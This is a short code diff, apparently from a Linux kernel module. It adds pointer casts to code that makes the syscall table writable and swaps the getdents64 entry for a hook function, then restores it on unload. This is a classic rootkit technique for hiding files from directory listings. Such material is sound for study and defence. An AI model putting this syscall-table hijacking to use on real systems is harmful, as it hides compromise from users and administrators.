@@ -99,14 +99,14 @@ int f_init(void) {
   }
 
   set_page_rw((uintptr_t)sct, 1);
-  getdents64_original = sct[__NR_getdents64];
-  sct[__NR_getdents64] = getdents64_hook;
+  getdents64_original = (uintptr_t)sct[__NR_getdents64];
+  sct[__NR_getdents64] = (uintptr_t*)getdents64_hook;
 
   return 0;
 }
 
 void f_exit(void) {
-  sct[__NR_getdents64] = getdents64_original;
+  sct[__NR_getdents64] = (uintptr_t*)getdents64_original;
   set_page_rw((uintptr_t)sct, 0);
 }
 
